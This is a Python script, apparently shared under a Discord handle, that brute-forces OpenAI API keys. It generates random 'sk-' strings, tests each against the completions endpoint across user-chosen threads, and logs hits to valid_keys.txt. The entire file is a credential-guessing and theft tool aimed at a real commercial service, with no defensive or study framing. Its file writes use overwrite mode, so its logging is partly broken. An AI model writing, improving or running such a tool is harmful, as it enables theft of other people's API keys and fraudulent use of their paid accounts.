import importlib
import sys
import os

os.system("title [GPTAPIKey$Gen] by [@Syntaxerror#0756] Version: 1.2")

def check_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        print('Downloading...')
        os.system(f"{sys.executable} -m pip install {package_name}")
        os.system('cls')


check_package("colorama")
check_package("requests")

import random
import string
import threading
import requests
import time
from colorama import init, Fore

init()

num_threads = int(input(Fore.BLUE + "Enter the number of threads to use:\n"))
extendedlogs = int(input(Fore.BLUE + "Enable Unauthorized reson? (1)Yes (0)No\n"))
between = int(input(Fore.BLUE + "Do you want to use different numbers than 32 between 64? (1)Yes (0)No\n"))

if between == 1:
    length1 = int(input(Fore.BLUE + "Say Minimum First:\n"))
    length2 = int(input(Fore.BLUE + "Now Maximum Max 64\n"))
else:
    length1 = 32
    length2 = 64

def generate_and_check_key():
    while True:
        key_length = random.randint(length1, length2)
        key_characters = string.ascii_letters + string.digits
        key = ''.join(random.choice(key_characters) for _ in range(key_length))
        api_key = "sk-" + key
        if api_key.startswith("sk-") and all(c in key_characters for c in key):
            try:
                response = requests.post(
                    "https://api.openai.com/v1/engines/davinci-codex/completions",
                    headers={"Authorization": f"Bearer {api_key}"},
                    json={
                        "prompt": "Hello, World!",
                        "max_tokens": 1
                    }
                )
                if response.status_code == 200:
                    print(Fore.GREEN + f"Valid: {api_key} - Server Response: {response.json()}")
                    with open("valid_keys.txt", "w+") as f:
                        f.write(api_key + "\n")
                elif response.status_code == 401:
                    if extendedlogs == 1:
                        print(Fore.RED + f"Unauthorized: {api_key} - Server Response: {response.json()}")
                    else:
                        print(Fore.RED + f"Unauthorized: {api_key}")
                elif response.status_code == 429:
                    print(Fore.YELLOW + f"Rate Limited: {api_key} - Server Response: {response.json()}")
                    with open("rate_limited_keys.txt", "w+") as f:
                        f.write(api_key + "\n")
                elif response.status_code >= 400 and response.status_code < 500:
                    print(Fore.YELLOW + f"Client Error: {api_key} - Response Status Code: {response.status_code} - Server Response: {response.json()}")
                    with open("Client_error_keys.txt", "w+") as f:
                        f.write(api_key + "\n")
                elif response.status_code >= 500 and response.status_code < 600:
                    print(Fore.YELLOW + f"Server Error: {api_key} - Response Status Code: {response.status_code} - Server Response: {response.json()}")
                    with open("Server_error_keys.txt", "w+") as f:
                        f.write(api_key + "\n")
                else:
                    print(Fore.YELLOW + f"Unknown Error: {api_key} - Response Status Code: {response.status_code} - Server Response: {response.json()}")
                    with open("Unknown.txt", "w+") as f:
                        f.write(api_key + "\n")
            except requests.exceptions.Timeout:
                print(Fore.YELLOW + f"Timeout Error: {api_key}")
                with open("timeout_keys.txt", "w+") as f:
                    f.write(api_key + "\n")
            except requests.exceptions.RequestException as e:
                print(Fore.YELLOW + f"Request Error: {api_key} - {e}")
                with open("request_error_keys.txt", "w+") as f:
                    f.write(api_key + "\n")
        else:
            print(Fore.YELLOW + f"API Error: {api_key}")
            with open("api_error_keys.txt", "w+") as f:
                f.write(api_key + "\n")
        time.sleep(1)

from concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    for i in range(num_threads):
        executor.submit(generate_and_check_key)

